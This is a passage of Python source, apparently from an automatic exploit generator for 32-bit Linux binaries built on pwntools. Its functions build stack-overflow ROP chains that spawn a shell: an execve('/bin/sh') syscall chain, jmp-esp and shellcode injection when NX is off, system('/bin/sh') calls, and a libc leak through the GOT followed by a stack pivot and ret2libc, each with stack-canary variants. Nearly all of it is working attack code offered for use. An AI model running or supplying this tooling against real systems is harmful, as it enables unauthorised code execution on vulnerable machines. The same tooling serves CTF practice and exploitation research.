                syscall_tab=syscall_tab_value
            ))
            # self.AvoidUbuntuVersionError(final_payload)
            # finish the execve syscall
            ebx_value = binsh_addr_element
            ecx_value = PayloadElement(
                datavalue=0, adjustinfo=None, datatype="int32")
            edx_value = PayloadElement(
                datavalue=0, adjustinfo=None, datatype="int32")
            syscall_tab_value = PayloadElement(
                datavalue=pwn.constants.linux.i386.SYS_execve,
                adjustinfo=None, datatype="int32"
            )
            final_payload.extend(self.SyscallROPPayloadGenerate_X86(
                ebx=ebx_value, ecx=ecx_value, edx=edx_value,
                syscall_tab=syscall_tab_value
            ))
            final_payload_canary = final_payload[:]
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_load = SinglePayload(
                content=final_payload, length=0,
                prefixlength=0, needline=False,
                avoidchars=b""
            )
            singlepayload_canary = SinglePayload(
                content=final_payload_canary, length=self.needlength,
                prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_canary_load = SinglePayload(
                content=final_payload_canary, length=0,
                prefixlength=self.canary_offset_ebp, needline=False,
                avoidchars=b""
            )
            if not self.HandleFinalPayload(
                singlepayload=singlepayload,
                singlepayload_load=singlepayload_load,
                singlepayload_canary=singlepayload_canary,
                singlepayload_canary_load=singlepayload_canary_load,
                haverecvlibc=False,
                issystemroppayload=False# syscall is not system rop
            ):
                log.info("cannot generate payload in ROPPayloadStaticNXEnable_X86")
                return False
            payload2 = [PayloadElement(
                datavalue=binsh_string, adjustinfo=None, datatype="bytes")]
            self.payloadlist.AppendPayload(SinglePayload(
                content=payload2, length=len(binsh_string),
                prefixlength=0
            ))
            return True

    def ROPPayloadDynamicNXDisable_X86(self):
        """
        no NX enabled, jmp esp and to shellcode
        :return: True when success, False when not
        """
        method1 = self.JmpEspPayloadGenerate()
        if method1:
            return True
        method2 = self.LoadShellcodeAndReturn()
        if method2:
            return True
        bss_address = self.GetBssAddressWrite(for_rop=False)
        shellcode_address = bss_address
        shellcode_address_element = PayloadElement(
            datavalue=shellcode_address, adjustinfo="elf_base", datatype="int32"
        )
        shellcode = self.GenerateShellcode()
        final_payload, next_avoidchars, next_needline = self.InputROPPayloadGenertate(
            address_element=shellcode_address_element,
            length=len(shellcode),
            return_element=shellcode_address_element,
            need_pop=False
        )
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_ebp, needline=False,
            avoidchars=b""
        )
        if not self.HandleFinalPayload(
            singlepayload=singlepayload,
            singlepayload_load=singlepayload_load,
            singlepayload_canary=singlepayload_canary,
            singlepayload_canary_load=singlepayload_canary_load,
            haverecvlibc=False,
            issystemroppayload=False # input rop for shellcode
        ):
            log.info("cannot successfully generate payload in ROPPayloadDynamicNXDisable_X86")
            return False
        # self.GenerateFinalPayloadNoRecv(singlepayload=singlepayload)
        # self.payloadlist.AppendPayload(singlepayload)
        final_payload2 = [PayloadElement(
            datavalue=shellcode, adjustinfo=None, datatype="bytes")]
        self.payloadlist.AppendPayload(SinglePayload(
            content=final_payload2, length=len(shellcode),
            prefixlength=0, avoidchars=next_avoidchars,
            needline=next_needline
        ))
        return True

    def DynamicNXEnableHaveSystem_x86(self):
        """
        NX enabled, use ROP to solve the problem, and have system
        but no binsh in x86
        :return: True when successfully generated, False when not
        """
        system = self.elf.symbols["system"]
        system_element = PayloadElement(
            datavalue=system, adjustinfo="elf_base", datatype="int32")
        bss_address = self.GetBssAddressWrite(for_rop=False)
        bss_address_element = PayloadElement(
            datavalue=bss_address, adjustinfo="elf_base", datatype="int32")
        bss_address_element2 = PayloadElement(
            datavalue=bss_address, adjustinfo="elf_base", datatype="int32")
        binsh_string = b"/bin/sh\x00"
        final_payload, next_avoidchars, next_needline = self.InputROPPayloadGenertate(
            address_element=bss_address_element,
            length=len(binsh_string),
            return_element=PayloadElement(),
            need_pop=True
        )
        final_payload.append(system_element)
        final_payload.append(PayloadElement(
            datavalue=0, adjustinfo=None, datatype="int32"
        ))
        final_payload.append(bss_address_element2)
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_ebp, needline=False,
            avoidchars=b""
        )
        if not self.HandleFinalPayload(
            singlepayload=singlepayload,
            singlepayload_load=singlepayload_load,
            singlepayload_canary=singlepayload_canary,
            singlepayload_canary_load=singlepayload_canary_load,
            haverecvlibc=False,
            issystemroppayload=True # system payload
        ):
            log.info("cannot successfully generate payload in DynamicNXEnableHaveSystem_x86")
            return False
        final_payload2 = [PayloadElement(
            datavalue=binsh_string, adjustinfo=None, datatype="bytes")]
        self.payloadlist.AppendPayload(SinglePayload(
            content=final_payload2, length=len(binsh_string),
            prefixlength=0, avoidchars=next_avoidchars,
            needline=next_needline
        ))
        return True

    def DynamicNXEnableNoSystem_x86(self):
        """
        NX enabled, use ROP to solve the problem, and no system
        :return: True when successfully generated, False when not
        """
        final_payload = []
        leak_payload = self.GenerateLeakPayload(
            leak_address=self.elf.got["__libc_start_main"],
            adjustinfo="elf_base"
        )
        if leak_payload is not None:
            final_payload.extend(leak_payload)
        else:
            # log.Exception("leak payload generate error, please check it")
            log.info("leak payload generate failed, use ret_to_dl_resolve to solve it")
            return self.Generate_dlruntime_resolve_Payload()
        bss_address = self.GetBssAddressWrite(for_rop=True)
        bss_address_element = PayloadElement(
            datavalue=bss_address, adjustinfo="elf_base", datatype="int32")
        input_payload, next_avoidchars, next_needline = self.InputROPPayloadGenertate(
            address_element=bss_address_element,
            length=4 * 3,
            return_element=PayloadElement(),
            need_pop=True
        )
        if input_payload is None:
            log.Exception("cannot successfully genertate payload in DynamicNXEnableNoSystem_x64")
            return False
        final_payload.extend(input_payload)
        ebp_gadget = self.gadgetservice.FindPopGadget(register="ebp")
        bss_address_minus4_element = PayloadElement(
            datavalue=bss_address - 0x4, adjustinfo="elf_base",
            datatype="int32")
        final_payload.extend(self.RegisterGadgetGenerate(
            gadget=ebp_gadget, register="ebp",
            register_value=bss_address_minus4_element
        ))
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int32"
        ))
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_ebp, needline=False,
            avoidchars=b""
        )
        if not self.HandleFinalPayload(
            singlepayload=singlepayload,
            singlepayload_load=singlepayload_load,
            singlepayload_canary=singlepayload_canary,
            singlepayload_canary_load=singlepayload_canary_load,
            haverecvlibc=True,
            issystemroppayload=True #puts will affect this, we should avoid this
        ):
            log.info("cannot successfully generate payload in ROPPayloadDynamicNXDisable_X86")
            return False
        final_payload2 = []
        final_payload2.append(PayloadElement(
            datavalue=self.libc.symbols["system"],
            adjustinfo="libc_base", datatype="int32"
        ))
        final_payload2.append(PayloadElement(
            datavalue=0,
            adjustinfo=None, datatype="int32"
        ))
        final_payload2.append(PayloadElement(
            datavalue=next(self.libc.search(b"/bin/sh")),
            adjustinfo="libc_base", datatype="int32"
        ))
        self.OptimizeForROP(payload=final_payload2, adjustcanary=False)
        singlepayload = SinglePayload(
            content=final_payload2, length=0x4 * 3,
            prefixlength=0, avoidchars=next_avoidchars,
            needline=next_needline
        )
        self.payloadlist.AppendPayload(singlepayload)
        return True

    def ROPPayloadDynamicNXEnable_X86(self):
        """
        NX enabled, use ROP to solve the problem
        :return: True when successfully generated, False when not
        """
        if "system" in self.elf.symbols.keys():
            log.info("find a system symbol in this binary, just use this")
            havesystem = True
            system = self.elf.symbols["system"]
            system_element = PayloadElement(
                datavalue=system, adjustinfo="elf_base", datatype="int32")
        else:
            log.info("no system in this binary, try to use ROP")
            havesystem = False
            system = 0
            system_element = PayloadElement()
        try:
            log.info("find /bin/sh string in this binary:")
            binsh = next(self.elf.search(b"/bin/sh\x00"))
            binsh_element = PayloadElement(
                datavalue=binsh, adjustinfo="elf_base", datatype="int32")
            havebinsh = True
        except:
            log.info("cannot find /bin/sh string in this binary")
            try:
                log.info("find sh string in this binary:")
                binsh = next(self.elf.search(b"sh\x00"))
                binsh_element = PayloadElement(
                    datavalue=binsh, adjustinfo="elf_base", datatype="int32")
                havebinsh = True
            except:
                log.info("cannot find /bin/sh string in this binary")
                binsh = 0
                binsh_element = PayloadElement()
                havebinsh = False
        if havesystem and havebinsh:
            log.info("have system and binsh, overwrite the return address to system and give binsh parameter")
            final_payload = []
            final_payload.append(system_element)
            final_payload.append(PayloadElement(
                datavalue=binsh, adjustinfo=None, datatype="int32"
            ))
            final_payload.append(binsh_element)
            # self.AvoidUbuntuVersionError(final_payload)
            final_payload_canary = final_payload[:]
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_load = SinglePayload(
                content=final_payload, length=0,
                prefixlength=0, needline=False,
                avoidchars=b""
            )
            singlepayload_canary = SinglePayload(
                content=final_payload_canary, length=self.needlength,
                prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_canary_load = SinglePayload(
                content=final_payload_canary, length=0,
                prefixlength=self.canary_offset_ebp, needline=False,
                avoidchars=b""
            )
            if not self.HandleFinalPayload(
                singlepayload=singlepayload,
                singlepayload_load=singlepayload_load,
                singlepayload_canary=singlepayload_canary,
                singlepayload_canary_load=singlepayload_canary_load,
                haverecvlibc=False,
                issystemroppayload=True #system("/bin/sh") payload
            ):
                log.info("cannot successfully generate payload in ROPPayloadDynamicNXDisable_X86")
                return False
            return True
        if havesystem and not havebinsh:
            log.info("have system but no binsh, use ROP to write a binsh and ROP")
            if self.DynamicNXEnableHaveSystem_x86():
                return True
        if not havesystem:
            log.info("no system, must use leak info to leak libc base and ROP")
            if self.DynamicNXEnableNoSystem_x86():
                return True
        return False
